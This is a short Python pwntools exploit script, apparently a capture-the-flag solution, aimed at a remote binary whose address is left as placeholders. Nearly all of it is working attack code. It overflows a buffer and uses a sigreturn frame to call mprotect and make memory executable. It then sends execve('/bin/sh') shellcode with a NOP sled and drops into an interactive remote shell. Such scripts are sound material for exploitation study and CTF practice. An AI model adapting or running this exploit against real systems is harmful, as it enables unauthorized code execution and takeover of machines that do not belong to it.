#!/usr/bin/python3

from pwn import *

context.clear(arch='amd64')

syscall = 0x401014
vuln_function  = p64(0x40102e)
vuln_pointer = 0x4010d8
writable = 0x400000
frame = SigreturnFrame(kernel='amd64')
frame.rax = 10 #Mprotect for syscall table
frame.rdi = writable #Writable memory segment
frame.rsi = 0x4000 #Size
frame.rdx = 7 #Read/Write/Exectable access
frame.rsp = vuln_pointer #Why not vuln function but a pointer to vuln? Explained below
frame.rip = syscall #Calling the syscall in the end

shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05") # 23B // From shellstrorm

payload = b"A"*40 + vuln_function + p64(syscall) + bytes(frame)

def pwn():
    binary = remote("IP", PORT)
    print("Payload length: ", len(payload), " Plus Newline: ", len(payload) + 1)
    print("Cyclic length: ", len(cyclic(50)))
    binary.sendline(payload)
    binary.recv()
    payload2 = b"C"*15
    binary.send(payload2)
    binary.recv()
    payload3 = shellcode + b"\x90"*17 + p64(0x00000000004010b8)
    binary.send(payload3)
    binary.recv()
    binary.interactive()


if __name__ == '__main__':
    pwn()
